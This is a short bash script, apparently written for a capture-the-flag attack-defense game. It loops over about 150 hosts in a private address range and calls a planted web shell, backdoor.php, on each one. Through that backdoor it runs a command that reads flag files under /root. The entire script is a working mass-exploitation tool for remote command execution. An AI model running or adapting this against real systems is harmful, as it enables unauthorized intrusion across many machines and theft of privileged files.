#!/bin/bash
for i in {99..254}
do
	echo $i
	curl http://172.16.$i.8/backdoor.php?cmd=cat%20/root/flag*  --connect-timeout 1
done
